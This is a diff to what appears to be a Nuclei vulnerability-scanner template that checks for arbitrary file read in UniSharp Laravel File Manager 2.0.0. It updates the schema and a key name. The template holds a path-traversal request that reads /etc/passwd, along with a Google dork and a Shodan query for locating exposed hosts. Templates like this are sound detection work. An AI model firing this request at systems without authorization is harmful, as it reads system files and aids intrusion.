@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: laravel-filemanager-lfi
 info:
   name: UniSharp Laravel File Manager 2.0.0 - Arbitrary File Read
@@ -10,7 +11,7 @@ info:
     google-dork: inurl:"laravel-filemanager?type=Files" -site:github.com -site:github.io
     shodan-query: http.html:"Laravel FileManager"
   tags: lfi,unisharp,laravel,filemanager,fileupload,lfr
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/laravel-filemanager/download?working_dir=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2F&type=&file=passwd"
